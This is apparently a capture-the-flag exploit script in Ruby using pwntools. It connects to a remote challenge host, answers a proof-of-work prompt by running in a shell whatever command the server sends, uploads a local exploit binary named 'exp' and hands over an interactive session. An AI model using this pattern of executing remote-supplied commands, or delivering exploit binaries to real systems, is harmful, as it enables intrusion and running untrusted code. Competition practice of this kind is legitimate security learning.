#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby

host, port = '13.231.7.116', 9427
@local = false
@p = ''
if ARGV.empty?
  host = '127.0.0.1'; @local = true
  # $z = Tubes::Process.new(@p)
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new(host, port)
def z;$z;end
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def libc; @libc ||= ELF.new('./libc.so.6'); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pow
  z.gets "Proof of Work - Give me the token of:\n"
  cmd = z.gets
  z.puts `#{cmd}`.strip
end

pow

z.gets "File size in bytes? (MAX: 2M)\n"
exp = IO.binread(File.join(__dir__, 'exp'))
z.puts exp.size
z.write exp
z.interact
